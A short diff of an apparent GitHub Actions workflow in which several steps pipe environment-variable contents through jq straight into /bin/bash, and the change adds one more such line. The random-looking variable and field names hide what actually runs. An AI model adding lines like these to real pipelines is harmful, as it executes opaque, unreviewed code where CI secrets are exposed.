@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$m11" | jq -r .gvgn65 | /bin/bash
           printf '%s' "$mhe9776" | jq -r .cnmo3130 | /bin/bash
           printf '%s' "$inm61794" | jq -r .f7123 | /bin/bash
+          printf '%s' "$n742" | jq -r .biagf9 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
